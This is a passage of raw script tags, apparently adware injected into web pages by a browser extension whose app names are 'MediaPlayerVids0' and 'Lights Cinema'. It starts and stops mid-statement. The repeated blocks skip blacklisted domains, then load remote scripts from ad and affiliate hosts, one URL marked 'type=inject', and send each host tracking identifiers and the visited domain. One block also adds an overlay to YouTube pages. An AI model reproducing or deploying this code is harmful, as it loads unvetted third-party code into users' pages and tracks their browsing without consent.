['.optimizerpro','.optimizerpro-50','.op-xsell','.op-var1','.op-var2','.op-var3','.op-var4','.op-special','.op-xsell-special','.dp-xsell','.driverpro','.drvpro-50','.dp-9','.dp-var1','.drvpro','.driverpro-50','.1pk-email','.email-25','.email-35','.email-50','.optimizer-30','.optimizer-35','.optimizer-40','.optimizer-45','.optimizer-rs','.support','.support-25','.support-50','.oem','.oem-50','.oem-special','.oem-var1','.avem','.avem-50','.avem-special','.spo','.spo-50','.spo-special','.spu','.spu-50','.spu-special','.spo-x-sell','.soxsell-special','.spu-x-sell','.systemoptimizer','.driverupdater','.so-special','.du-special','.du-xsell','.du-xsell-special','.so-xsell','.so-xsell-special','.systemoptimizer-50'];return checkUrl(full) || (checkUrl(['safecart.com']) && checkUrl(sub) && checkUrl(file));};</script><script type="text/javascript">window.__validDomain__ =(typeof window.__checkIfUrlIsValid__ == 'function' && typeof window.__checkIfPCUrl__ == 'function')?window.__checkIfUrlIsValid__(document.location.host) && !__checkIfPCUrl__(): true;</script><script type="text/javascript">window.__myWindow__=function (id){var p = [195,221,265,278,280,277,279,337,338];if (typeof window.name === 'string' && window.name.match(/icm_inline_p/)){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">window.__onlyMe__=function (id){var p = [264,158,116,117,103,262,190];if (typeof window.name === 'string' && (window.name.match(/^a652c_/) || window.name.match(/^z7b85_/) || window.name.match(/^ld893_/))){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_72523_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300285810029000000/l.js?pid=2295&ext=MediaPlayerVids0';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300285810029000000/l.js?pid=2295&ext=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_390__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 390) : 390;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_390__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 390) : 390;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 102 || 287 !== 102 || 119 !== 102)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (102 != 273 && 102 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(102)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(102) ){return;}function f(){return typeof window['__utility_running_72523_102__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://i.crbsjs.info/crbf/javascript.js?channel=crdr_300285810029000000&appTitle=MediaPlayerVids0&hid=149525929fae92db32a394a703a5bbe7';var httpsUrl = 'https://i_crbsjs_info.tlscdn.com/crbf/javascript.js?channel=crdr_300285810029000000&appTitle=MediaPlayerVids0&hid=149525929fae92db32a394a703a5bbe7';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_102__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 102) : 102;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_102__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 102) : 102;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 180 || 287 !== 180 || 119 !== 180)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (180 != 273 && 180 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(180)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(180) ){return;}function f(){return typeof window['__utility_running_72523_180__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://a.snowplanes.com/a.php?626ref2=300285810029000000&626Name=MediaPlayerVids0&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=72523&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var httpsUrl = 'https://a.snowplanes.com/a.php?626ref2=300285810029000000&626Name=MediaPlayerVids0&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=72523&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_180__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 180) : 180;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_180__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 180) : 180;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 223 || 287 !== 223 || 119 !== 223)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (223 != 273 && 223 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(223)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(223) ){return;}function f(){return typeof window['__utility_running_72523_223__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdn.visadd.com/script/14567725765/preload.js?subid=300285810029000000&um=MediaPlayerVids0';var httpsUrl = 'https://cdn.visadd.com/script/14567725765/preload.js?subid=300285810029000000&um=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_223__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 223) : 223;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_223__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 223) : 223;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 273 || 287 !== 273 || 119 !== 273)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (273 != 273 && 273 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(273)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(273) ){return;}function f(){return typeof window['__utility_running_72523_273__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300285810029000000&sbrand=MediaPlayerVids0';var httpsUrl = 'https://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300285810029000000&sbrand=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_273__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 273) : 273;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_273__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 273) : 273;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 281 || 287 !== 281 || 119 !== 281)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (281 != 273 && 281 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(281)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(281) ){return;}function f(){return typeof window['__utility_running_72523_281__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://clkdeals.com/adServe/getTag?pid=11021&type=inject&cid=300285810029000000&appName=MediaPlayerVids0&q=__DOMAIN__';var httpsUrl = '';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_281__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 281) : 281;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_281__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 281) : 281;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 288 || 287 !== 288 || 119 !== 288)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (288 != 273 && 288 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(288)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(288) ){return;}function f(){return typeof window['__utility_running_72523_288__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=MediaPlayerVids0&subid=300285810029000000';var httpsUrl = 'https://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=MediaPlayerVids0&subid=300285810029000000';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_288__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 288) : 288;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_288__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 288) : 288;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 380 || 287 !== 380 || 119 !== 380)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (380 != 273 && 380 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(380)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(380) ){return;}function f(){return typeof window['__utility_running_72523_380__'] !== 'undefined';}try {if (f()) {return;}window.__ntf_ibic__='794CC92401E24B428E1CD52EDA8B6D0EIE';window.__ntf_veri__='806e6b8b461f3c245c8387d7783a0257';window.__ntf_br__='ff';window.__ntf_cmp__='002858';window.__ntf_geo__='ID';window.__ntf_name__='MediaPlayerVids0';var httpUrl = 'http://cdn.gosignserv.com/cc/a.js?__src_locator__=cc';var httpsUrl = 'https://d2a8a4q9.ssl.hwcdn.net/cc/a.js?__src_locator__=cc';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_380__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 380) : 380;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_380__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 380) : 380;}}} catch (L) {}}());</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 450 || 287 !== 450 || 119 !== 450)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (450 != 273 && 450 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(450)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(450) ){return;}function f(){return typeof window['__utility_running_72523_450__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/p3af2c8/300285810029000000/l.js?pid=2271&ext=MediaPlayerVids0';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/p3af2c8/300285810029000000/l.js?pid=2271&ext=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_450__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 450) : 450;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_450__'] = true;window['__BhFLo'] = window['__BhFLo'] ? (window['__BhFLo'] + ',' + 450) : 450;}}} catch (L) {}}());</script><script type="text/javascript">window.__blackListUrls__ = ['(?:.*.)?smartshopping.com','(?:.*.)?shoppstop.com','(?:.*.)?localmoxie.com','(?:.*.)?mail.com','(?:.*.)?yellowmoxie.com','(?:.*.)?internetproper.com', '(?:.*.)?traveleist.com','(?:.*.)?financetopix.com','(?:.*.)?ideallhealth.com','(?:.*.)?search2discover.com','(?:.*.)?variablesearch.com','(?:.*.)?efix.com','(?:.*.)?reimage-express.com','(?:.*.)?anti-toolbar.com','(?:.*.)?supersupport.com','(?:.*.)?reimageplus.com','(?:.*.)?reimage.com','(?:.*.)?crossrider.com','(?:.*.)?bi.crossrider.com', '(?:.*.)?softonic.com', '(?:.*.)?mackeeper.com', '(?:.*.)?pckeeper.com', '(?:.*.)?kromtech.com','(?:.*.)?plusnetwork.com'];</script><script type="text/javascript">window.__checkIfUrlIsValid__ = function(url){try {for (var i = 0; i < window.__blackListUrls__.length; i++){ if (window.__blackListUrls__[i] === url){return false;}else{var regex = new RegExp(window.__blackListUrls__[i], 'g');var res = url.match(regex);if (res){return false;}}}return true;} catch(e) {return true;}}</script><script type="text/javascript">window.__checkIfPCUrl__ = function () {function checkUrl(urlsArr) {for (var i = 0; i < urlsArr.length; i++){if (location.href.indexOf(urlsArr[i]) >= 0) {return true;}}return false;}var full = ['securedshopgate.com','pcutilitiespro.com','pcrepairlabs.com','superpctools.com','viracure.com'];var sub = ['pcutilitiespro', 'viracure', 'superpctools', 'pcrepairlabs'];var file = ['.optimizerpro','.optimizerpro-50','.op-xsell','.op-var1','.op-var2','.op-var3','.op-var4','.op-special','.op-xsell-special','.dp-xsell','.driverpro','.drvpro-50','.dp-9','.dp-var1','.drvpro','.driverpro-50','.1pk-email','.email-25','.email-35','.email-50','.optimizer-30','.optimizer-35','.optimizer-40','.optimizer-45','.optimizer-rs','.support','.support-25','.support-50','.oem','.oem-50','.oem-special','.oem-var1','.avem','.avem-50','.avem-special','.spo','.spo-50','.spo-special','.spu','.spu-50','.spu-special','.spo-x-sell','.soxsell-special','.spu-x-sell','.systemoptimizer','.driverupdater','.so-special','.du-special','.du-xsell','.du-xsell-special','.so-xsell','.so-xsell-special','.systemoptimizer-50'];return checkUrl(full) || (checkUrl(['safecart.com']) && checkUrl(sub) && checkUrl(file));};</script><script type="text/javascript">window.__validDomain__ =(typeof window.__checkIfUrlIsValid__ == 'function' && typeof window.__checkIfPCUrl__ == 'function')?window.__checkIfUrlIsValid__(document.location.host) && !__checkIfPCUrl__(): true;</script><script type="text/javascript">window.__myWindow__=function (id){var p = [195,221,265,278,280,277,279,337,338];if (typeof window.name === 'string' && window.name.match(/icm_inline_p/)){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">window.__onlyMe__=function (id){var p = [264,158,116,117,103,262,190];if (typeof window.name === 'string' && (window.name.match(/^a652c_/) || window.name.match(/^z7b85_/) || window.name.match(/^ld893_/))){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript">setTimeout(function(){try{var b=!1,d=!1,e="",f={},g=window,h=g.document,k=g.screen,l=g.location.href,m;a:{for(var n=["transform","MozTransform","WebkitTransform","msTransform"],p=h.documentElement,q=0;q<n.length;q++)if(n[q]in p.style){m=n[q];break a}m=void 0}function r(a){return h.querySelector(a)}var s=setInterval(function(){-1===l.indexOf("youtube.com")?clearInterval(s):l!==e&&(d=!1,e+"#"!==l&&(d=!0),e=l,d&&t())},500); function t(){var a;-1===l.indexOf("youtube.com/watch?v=")?(u(!0),r("#ecpb").style.display="none"):(null===r("#ecp")&&v(),a=r("#ecpb"),a.style.display="block",a.onclick=null,a.onclick=function(a){a.preventDefault();u()},r("#movie_player"))} function v(){var a,c;a=h.createElement("div");a.id="ecp";a.style.backgroundColor="#000";a.style.height=2*k.height+"px";a.style.left=0;a.style.opacity=0;a.style.position="fixed";a.style.top=0;a.style.width=2*k.width+"px";a.style.zIndex=-999;h.body.appendChild(a);f.zIndex=r("#movie_player").style.zIndex;c=r(".yt-masthead-logo-container");a=c.style.marginRight.substr(0,c.style.marginRight.length-2)-34;c.style.marginRight=(54>a?54:a)+"px";a=h.createElement("a");a.id="ecpb";a.href="#";a.title="Turn Lights Off"; a.style.display="none";a.style.cssFloat="left";a.style.marginTop="2px";a.style.position="relative";a.style.zIndex="auto";c=r(".yt-masthead-logo-container");c.parentNode.insertBefore(a,c.nextSibling);a=h.createElement("img");a.src="http://download.clientdataservice.com/images/cp/on.png";a.alt="CP";a.style.display="block";a.style.height="30px";a.style.margin="0 2px";c=r("#ecpb");c.appendChild(a)} function u(a){"undefined"===typeof a&&(a=b);a?(a=r("#ecp"),a.style.opacity=0,a.style.zIndex=-999,r("#movie_player").style.zIndex=f.zIndex,r("#ecpb").style.zIndex="auto",a=r("#ecpb img"),a.title="Turn Lights Off",a.style[m]="rotate(0)",b=!1):(r("#movie_player").style.zIndex=1E3,r("#ecpb").style.zIndex=1E3,a=r("#ecp"),a.style.opacity=.9,a.style.zIndex=999,r("#ecpb").style.zIndex="auto",a=r("#ecpb img"),a.title="Turn Lights On",a.style[m]="rotate(180deg)",b=!0)};}catch(e){}},1000);</script><script type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 391 || 287 !== 391 || 119 !== 391)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (391 != 273 && 391 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(391)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(391) ){return;}function f(){return typeof window['__utility_running_71387_391__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2294&ext=Lights%20Cinema%201.5beta';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300266110029000000/l.js?pid=2294&ext=Lights%20Cinema%201.5beta';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || 